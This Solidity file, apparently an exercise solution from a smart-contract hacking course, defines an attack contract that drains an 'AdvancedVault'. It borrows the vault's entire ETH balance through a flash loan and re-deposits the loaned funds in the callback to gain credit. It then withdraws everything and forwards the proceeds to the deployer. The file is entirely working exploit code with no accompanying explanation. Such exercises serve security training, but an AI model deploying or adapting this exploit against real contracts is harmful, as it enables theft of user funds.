// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/Address.sol";

interface IAdvancedVault {
    function depositETH() external payable;

    function withdrawETH() external;

    function flashLoanETH(uint256 amount) external;
}

contract AttackAdvancedVault {
    using Address for address payable;

    IAdvancedVault vault;
    address public immutable owner;

    constructor(address _vault) {
        vault = IAdvancedVault(_vault);
        owner = msg.sender;
    }

    function attack() external {
        vault.flashLoanETH(address(vault).balance);
        vault.withdrawETH();
    }

    function callBack() external payable {
        vault.depositETH{value: msg.value}();
    }

    receive() external payable {
        payable(owner).sendValue(msg.value);
    }
}
